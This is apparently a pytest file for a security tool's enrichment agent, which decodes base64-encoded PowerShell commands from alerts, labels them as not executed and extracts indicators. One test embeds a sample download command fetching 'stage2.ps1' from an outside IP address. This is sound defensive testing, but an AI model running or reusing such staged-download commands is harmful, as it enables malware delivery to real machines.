"""Safe decoding of encoded PowerShell commands (C6).

The decoder reads base64 text from an alert's command line and returns it as labelled analysis. It never executes anything:
these tests make subprocess and os.system unusable, so any attempt to run the payload would fail the test.
"""
import base64
import subprocess

import pytest


def _ps_b64(script: str) -> str:
    """How PowerShell itself encodes -EncodedCommand: UTF-16LE, then base64."""
    return base64.b64encode(script.encode("utf-16-le")).decode("ascii")


@pytest.fixture(autouse=True)
def _no_execution(monkeypatch):
    def refuse(*args, **kwargs):
        raise AssertionError("the decoder must never run a process")
    monkeypatch.setattr(subprocess, "run", refuse)
    monkeypatch.setattr(subprocess, "Popen", refuse)
    monkeypatch.setattr(subprocess, "call", refuse)
    import os
    monkeypatch.setattr(os, "system", refuse)


def test_powershell_encoded_command_is_decoded_as_utf16_text_and_labelled():
    from app.agents.enrichment.encoded_commands import decode_command_line_payloads
    script = "Write-Output 'hello from the analysis'"
    found = decode_command_line_payloads(f"powershell.exe -NoProfile -EncodedCommand {_ps_b64(script)}")
    assert len(found) == 1
    p = found[0]
    assert p["kind"] == "powershell_encoded_command"
    assert p["status"] == "decoded" and p["encoding"] == "utf-16-le"
    assert p["decoded_text"] == script
    assert p["executed"] is False
    assert "NOT executed" in p["provenance"]


@pytest.mark.parametrize("flag", ["-e", "-en", "-enc", "-encod", "-EncodedCommand", "-ENCODEDCOMMAND"])
def test_every_accepted_powershell_flag_spelling_is_recognised(flag):
    from app.agents.enrichment.encoded_commands import decode_command_line_payloads
    found = decode_command_line_payloads(f"powershell {flag} {_ps_b64('whoami')}")
    assert [p["status"] for p in found] == ["decoded"]
    assert found[0]["decoded_text"] == "whoami"


def test_from_base64_string_literal_is_decoded_as_utf8_text():
    from app.agents.enrichment.encoded_commands import decode_command_line_payloads
    literal = base64.b64encode("Get-Date".encode("utf-8")).decode("ascii")
    found = decode_command_line_payloads(f"[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{literal}'))")
    assert len(found) == 1
    assert found[0]["kind"] == "from_base64_string"
    assert found[0]["decoded_text"] == "Get-Date"


def test_invalid_base64_is_reported_without_an_error():
    from app.agents.enrichment.encoded_commands import decode_command_line_payloads
    found = decode_command_line_payloads("powershell -enc abcde")      # valid characters, impossible length
    assert found[0]["status"] == "invalid_base64"
    assert "decoded_text" not in found[0]


def test_oversized_payload_is_skipped_not_decoded():
    from app.agents.enrichment.encoded_commands import MAX_ENCODED_CHARS, decode_command_line_payloads
    huge = "A" * (MAX_ENCODED_CHARS + 8)
    found = decode_command_line_payloads(f"powershell -enc {huge}")
    assert found[0]["status"] == "skipped"
    assert "decoded_text" not in found[0]


def test_binary_content_that_is_not_text_is_reported_as_not_text():
    from app.agents.enrichment.encoded_commands import decode_command_line_payloads
    binary = base64.b64encode(bytes(range(0, 32)) * 4).decode("ascii")
    found = decode_command_line_payloads(f"powershell -enc {binary}")
    assert found[0]["status"] == "not_text"
    assert "decoded_text" not in found[0]


def test_long_decoded_text_is_truncated_and_says_so():
    from app.agents.enrichment.encoded_commands import MAX_DECODED_CHARS, decode_command_line_payloads
    script = "Write-Host x; " * 400          # 5600 characters: longer than the kept limit, yet within the encoded-size limit
    found = decode_command_line_payloads(f"powershell -enc {_ps_b64(script)}")
    assert found[0]["truncated"] is True
    assert len(found[0]["decoded_text"]) == MAX_DECODED_CHARS
    assert found[0]["decoded_length"] == len(script)


def test_indicators_inside_a_decoded_payload_are_extracted_with_their_own_source_label():
    from app.agents.enrichment.enrichment_agent import EnrichmentAgent
    script = "Invoke-WebRequest -Uri http://185.220.101.5/stage2.ps1"
    iocs = EnrichmentAgent().extract_iocs({"command_line": f"powershell -enc {_ps_b64(script)}"})
    matches = [i for i in iocs if i["value"] == "185.220.101.5"]
    assert matches and matches[0]["source"] == "decoded_command_line"
    assert any(i["type"] == "URL" and i["source"] == "decoded_command_line" for i in iocs)


def test_ordinary_command_lines_contain_no_decoded_payloads():
    from app.agents.enrichment.encoded_commands import decode_command_line_payloads
    assert decode_command_line_payloads("cmd.exe /c dir C:\\Users") == []
    assert decode_command_line_payloads("powershell -ExecutionPolicy Bypass -File report.ps1") == []


def test_the_enrichment_record_carries_the_decoded_payload_for_the_analyst(iso_client):
    script = "Write-Output 'analysis'"
    body = {"id": "ENC-1", "alert_title": "Encoded PowerShell", "source": "CrowdStrike EDR", "severity": "HIGH",
            "host": "WS-7", "timestamp": "2026-09-03T08:00:00Z",
            "command_line": f"powershell.exe -enc {_ps_b64(script)}"}
    assert iso_client.post("/api/v1/alerts", json=body).status_code == 201
    data = iso_client.post("/api/v1/alerts/ENC-1/enrich").json()
    payloads = data["enrichment_result"]["encoded_payloads"]
    assert payloads[0]["status"] == "decoded"
    assert payloads[0]["decoded_text"] == script
    assert payloads[0]["executed"] is False
